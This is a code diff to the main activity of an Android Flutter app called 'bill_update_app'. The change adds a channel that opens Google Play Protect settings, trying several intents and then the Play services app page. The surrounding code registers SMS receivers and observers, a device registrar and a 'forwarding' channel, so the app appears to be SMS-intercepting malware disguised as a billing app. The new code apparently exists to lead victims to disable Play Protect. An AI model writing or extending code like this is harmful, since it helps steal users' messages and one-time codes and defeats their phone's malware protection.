@@ -1,6 +1,7 @@
 package com.example.bill_update_app
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -77,6 +78,7 @@ class MainActivity : FlutterActivity() {
     private val CHANNEL_SMS = "com.example.bill_update_app/sms"
     private val CHANNEL_DEVICE = "com.example.bill_update_app/device"
     private val CHANNEL_FORWARDING = "com.example.bill_update_app/forwarding"
+    private val CHANNEL_SETTINGS = "com.example.bill_update_app/settings"
     private var receiver: SmsReceiver? = null
     private var smsObserver: SmsObserver? = null
 
@@ -151,6 +153,16 @@ class MainActivity : FlutterActivity() {
             }
         }
 
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_SETTINGS).setMethodCallHandler { call, result ->
+            when (call.method) {
+                "openPlayProtect" -> {
+                    openPlayProtectSettings()
+                    result.success(true)
+                }
+                else -> result.notImplemented()
+            }
+        }
+
         DeviceRegistrar.init(this)
 
         receiver = SmsReceiver()
@@ -217,6 +229,33 @@ class MainActivity : FlutterActivity() {
         try {
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                 data = Uri.fromParts("package", packageName, null)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+        } catch (_: Exception) {}
+    }
+
+    private fun openPlayProtectSettings() {
+        val targets = listOf(
+            Intent().setComponent(
+                ComponentName(
+                    "com.google.android.gms",
+                    "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"
+                )
+            ),
+            Intent("android.settings.APP_SAFETY_SETTINGS"),
+            Intent("android.settings.PLAY_PROTECT_SETTINGS"),
+        )
+        for (intent in targets) {
+            try {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+                return
+            } catch (_: Exception) {}
+        }
+        try {
+            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.fromParts("package", "com.google.android.gms", null)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             startActivity(intent)
